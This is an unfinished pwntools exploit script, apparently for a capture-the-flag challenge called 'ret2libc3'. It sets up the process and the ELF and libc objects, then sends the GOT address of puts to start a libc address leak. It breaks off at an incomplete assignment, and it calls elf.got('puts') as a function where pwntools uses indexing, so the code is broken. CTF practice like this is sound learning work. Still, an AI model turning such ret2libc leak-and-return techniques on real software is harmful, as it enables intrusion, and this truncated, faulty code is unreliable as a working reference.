from pwn import *
p=process('./ret2libc3')
context(arch='i386',os='linux',log_level='debug')
elf=ELF('./ret2libc3')
libc=ELF('./libc-2.23.so')

p.sendlineafter("(in dec) :",str(elf.got('puts')))
puts_addr=

